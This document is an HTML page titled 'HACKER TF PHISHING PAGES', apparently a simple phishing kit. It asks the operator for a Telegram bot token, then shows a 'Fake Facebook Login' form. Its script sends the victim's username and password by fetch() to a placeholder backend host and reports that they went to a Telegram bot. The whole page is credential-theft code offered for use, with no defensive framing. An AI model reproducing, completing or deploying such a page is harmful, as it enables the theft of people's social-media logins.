<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKER TF PHISHING PAGES</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1, h2 {
            color: #333;
        }
        input, button {
            margin: 10px 0;
            padding: 10px;
            font-size: 16px;
        }
        button {
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Welcome to HACKER TF PHISHING PAGE</h1>
    <button id="createLinkButton">Create Link</button>

    <div id="tokenForm" class="hidden">
        <input type="text" id="botToken" placeholder="Enter your Telegram Bot Token">
        <button id="submitToken">Submit</button>
    </div>

    <div id="fakeFacebookLogin" class="hidden">
        <h2>Fake Facebook Login</h2>
        <input type="text" id="fakeUsername" placeholder="Username">
        <input type="password" id="fakePassword" placeholder="Password">
        <button id="fakeLoginButton">Login</button>
    </div>

    <script>
        document.getElementById('createLinkButton').addEventListener('click', function() {
            document.getElementById('tokenForm').classList.remove('hidden');
        });

        document.getElementById('submitToken').addEventListener('click', function() {
            var botToken = document.getElementById('botToken').value;
            if (botToken) {
                document.getElementById('tokenForm').classList.add('hidden');
                document.getElementById('fakeFacebookLogin').classList.remove('hidden');
            }
        });

        document.getElementById('fakeLoginButton').addEventListener('click', function() {
            var username = document.getElementById('fakeUsername').value;
            var password = document.getElementById('fakePassword').value;
            if (username && password) {
                fetch('https://your-backend-server.com/send-login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                })
                .then(response => response.json())
                .then(data => {
                    alert('Login details sent to Telegram bot.');
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
            }
        });
    </script>
</body>
</html>
